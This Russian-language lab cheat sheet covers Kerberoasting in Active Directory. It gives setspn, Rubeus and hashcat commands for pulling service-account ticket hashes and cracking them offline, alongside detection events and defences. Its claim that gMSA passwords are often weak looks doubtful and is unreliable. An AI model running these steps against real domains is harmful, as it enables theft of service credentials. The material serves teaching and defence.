# Kerberoasting (Updated for 2025)

**Источник:** US Cloud, June 2025  
**Новизна в 2025:** Фокус на атаках на Group Managed Service Accounts (gMSA/dMSA), где пароли могут быть слабыми или предсказуемыми; новые инструменты оптимизированы для атак на gMSA.

---

## 🎯 Цель атаки
Извлечь хэши Kerberos сервисных аккаунтов (включая gMSA/dMSA) для оффлайн-взлома и получения доступа к сервисам в AD.

## 📋 Описание
Kerberoasting — атака, при которой злоумышленник запрашивает Kerberos Service Ticket (TGS) для SPN-аккаунта, который шифруется с использованием пароля учетной записи.  
В 2025 появились оптимизированные инструменты для работы с gMSA, чьи пароли могут быть слабее, чем у обычных сервисных учёток.

## ⚠ Условия эксплуатации
- Доступ к учетной записи домена (даже с низкими привилегиями).
- Наличие SPN-аккаунтов с уязвимыми паролями.
- Включенный Kerberos.

## 🔹 Пошагово в лаборатории
> ⚠ Только в тестовой среде!

1. Найти SPN-аккаунты (включая gMSA):
```powershell
setspn -Q */*
```
2. Запросить TGS с Rubeus:
```powershell
Rubeus.exe kerberoast /user:gmsa01$ /rc4 /nowrap
```
3. Взломать хэш оффлайн с Hashcat:
```bash
hashcat -m 13100 hashes.txt rockyou.txt
```

## 📊 Признаки в логах и мониторинг
- Event ID 4769 — выдача TGS для сервисных аккаунтов.
- Множественные запросы TGS от одного хоста.
- Необычные запросы от учетных записей пользователей.

## 🛡 Меры защиты
- Использовать длинные случайные пароли для сервисных аккаунтов.
- Ограничить выдачу TGS для некоторых аккаунтов.
- Мониторить события 4769 и аномалии в Kerberos.

## 🔍 Разбор команд

### 1. Получение SPN-аккаунтов
```powershell
setspn -Q */*
```
- **`setspn`** — утилита для работы с SPN в Windows.
- **`-Q */*`** — запрос всех SPN в домене.

### 2. Kerberoasting с Rubeus
```powershell
Rubeus.exe kerberoast /user:gmsa01$ /rc4 /nowrap
```
- **`/user`** — учетная запись gMSA.
- **`/rc4`** — шифрование RC4.
- **`/nowrap`** — вывод без переноса строк.

### 3. Взлом хэшей с Hashcat
```bash
hashcat -m 13100 hashes.txt rockyou.txt
```
- **`-m 13100`** — Kerberos 5 TGS-REP etype 23.
- **`hashes.txt`** — файл с хэшами.
- **`rockyou.txt`** — словарь для перебора.
